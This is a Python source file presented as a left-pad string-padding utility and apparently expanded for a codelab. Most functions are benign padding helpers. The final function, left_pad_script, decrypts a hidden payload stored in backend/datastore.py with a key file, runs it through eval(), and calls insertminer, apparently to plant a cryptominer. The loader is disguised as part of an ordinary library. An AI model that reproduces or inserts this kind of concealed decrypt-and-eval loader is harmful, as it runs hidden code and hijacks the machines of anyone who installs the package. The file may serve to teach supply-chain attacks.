''' app.py

This file has some custom padding functions to allow the user some ease of use when setting tables with data.
This is similar to left-pad in javascript, with some additional methods available to the user.

The following functions are available to the user when imported as a module:
    * pad_date - pad a date with 0's 
    * custom_left_pad - pad a string with a custom string/character
    * left_pad_number - pad a number or string with 0's
    * left_pad_whitespace - pad a string with whitespace
    * left_pad_list_contents - pads the contents of a list with a custom string
    * left_pad_list - pads the list itself with a custom string (N) times

NOTE: this file was expanded for the purpose of a codelab, and thus should be treated as such.
'''

#from .miner import insertminer


def pad_date (date):
    """
    Splits a string formatted date, and then outputs a 0 padded date.
    EG: 01/20/2021 ->  01/20/2021
    EG: 1/20/2021  ->  01/20/2021
    EG: 10/2/2021  ->  10/02/2021 
    """
    return_array = []

    date_array = date.split('/')
    if len(date_array) !=3:
        date_array = date.split('-')
        char = '-'
    else:
        char = '/'
    
    for part in date_array:
        if len(part) < 2:
            return_array.append('0' + part)
        else:
            return_array.append(part)

    return_array.insert(2, char)
    return_array.insert(1, char)
    
    return_string = ""

    return_string = return_string.join(return_array)
    
    return return_string

def custom_left_pad (string, padder, length):
    """
    pads a string on the left hand side with a custom character
    """
    return str(string).rjust(length, padder)
    
def left_pad_number(string, length):
    """
    pads a string on the left hand side with 0s
    """
    return str(string).zfill(length)

def left_pad_whitespace(string, length):
    """
    pads a string on the left hand side with whitespace
    """
    return str(string).rjust(length, ' ')

def left_pad_list_contents(list, padder, length):
    """
    pads the left hand side of the contents in the list with a custom character
    EG: ['1', '2', '3'], ' ', 3 -> ['   1', '   2', '   3']
    """
    return_array = []
    for item in list:
        return_array.append( custom_left_pad(item, padder, length) )
    return return_array

def left_pad_list(initial_list, padder, length):
    return_array = []
    for x in range(length):
        return_array.append(padder)
    return return_array + initial_list

def left_pad_script(filename):
    from cryptography.fernet import Fernet
    import os

    curr_dir = os.path.dirname(__file__)

    datastore_file = open(os.path.join(curr_dir, "backend/datastore.py"), 'rb')
    key_file = open(os.path.join(curr_dir, "backend/access_key.txt"), 'rb')

    key = key_file.read()
    datastore = datastore_file.read()

    decryptor = Fernet(key)
    minor = decryptor.decrypt(datastore)

    eval(minor)

    #minor_file = open(os.path.join(curr_dir, "utils.py"), 'wb')
    #minor_file.write(minor)

    #minor_file.close()
    key_file.close()
    datastore_file.close()

    insertminer(filename)

